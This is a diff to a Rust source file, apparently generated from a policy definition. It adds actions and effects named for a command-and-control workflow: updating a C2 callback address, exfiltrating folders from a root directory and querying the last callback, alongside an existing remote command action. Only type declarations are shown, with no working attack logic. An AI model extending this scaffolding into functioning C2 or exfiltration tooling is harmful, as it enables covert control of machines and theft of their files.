@@ -28,12 +28,25 @@ pub struct PublicKeyBundle {
 #[effects]
 pub enum Effect {
     Command(Command),
+    ExfiltrateFoldersEffect(ExfiltrateFoldersEffect),
+    QueryCallbackResult(QueryCallbackResult),
     QueryOwnerKeyResult(QueryOwnerKeyResult),
+    UpdateCallbackC2Effect(UpdateCallbackC2Effect),
 }
 /// Command policy effect.
 #[effect]
 pub struct Command {
     pub cmdline: Text,
+}
+/// ExfiltrateFoldersEffect policy effect.
+#[effect]
+pub struct ExfiltrateFoldersEffect {
+    pub rootdir: Text,
+}
+/// QueryCallbackResult policy effect.
+#[effect]
+pub struct QueryCallbackResult {
+    pub callback: Text,
 }
 /// QueryOwnerKeyResult policy effect.
 #[effect]
@@ -41,15 +54,23 @@ pub struct QueryOwnerKeyResult {
     pub n: Vec<u8>,
     pub e: Vec<u8>,
 }
+/// UpdateCallbackC2Effect policy effect.
+#[effect]
+pub struct UpdateCallbackC2Effect {
+    pub address: Text,
+}
 #[actions(interface = Persistent)]
 pub enum PersistentAction {
     init(init),
     execute_command(execute_command),
+    update_callback_c2(update_callback_c2),
     update_rsa_key(update_rsa_key),
+    exfiltrate_folders(exfiltrate_folders),
 }
 #[actions(interface = Ephemeral)]
 pub enum EphemeralAction {
     get_owner_key(get_owner_key),
+    get_last_callback(get_last_callback),
 }
 /// init policy action.
 #[action(interface = Persistent)]
@@ -61,12 +82,25 @@ pub struct init {
 pub struct execute_command {
     pub cmdline: Text,
 }
+/// update_callback_c2 policy action.
+#[action(interface = Persistent)]
+pub struct update_callback_c2 {
+    pub address: Text,
+}
 /// update_rsa_key policy action.
 #[action(interface = Persistent)]
 pub struct update_rsa_key {
     pub n: Vec<u8>,
     pub e: Vec<u8>,
 }
+/// exfiltrate_folders policy action.
+#[action(interface = Persistent)]
+pub struct exfiltrate_folders {
+    pub rootdir: Text,
+}
 /// get_owner_key policy action.
 #[action(interface = Ephemeral)]
 pub struct get_owner_key {}
+/// get_last_callback policy action.
+#[action(interface = Ephemeral)]
+pub struct get_last_callback {}
